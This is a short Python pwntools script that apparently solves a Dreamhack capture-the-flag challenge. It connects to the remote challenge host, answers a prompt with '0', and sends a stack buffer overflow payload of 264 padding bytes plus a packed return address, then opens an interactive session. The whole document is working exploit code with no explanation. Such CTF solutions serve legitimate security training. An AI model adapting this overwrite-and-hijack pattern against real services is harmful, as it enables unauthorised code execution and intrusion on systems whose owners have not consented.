from pwn import *

p = remote("host2.dreamhack.games", 10419)

pay = b"A"*264
pay += p32(0x08048659)

text = p.recv()
print(text)
p.sendline("0")

text = p.recv()
print(text)
p.sendline(pay)


p.interactive()
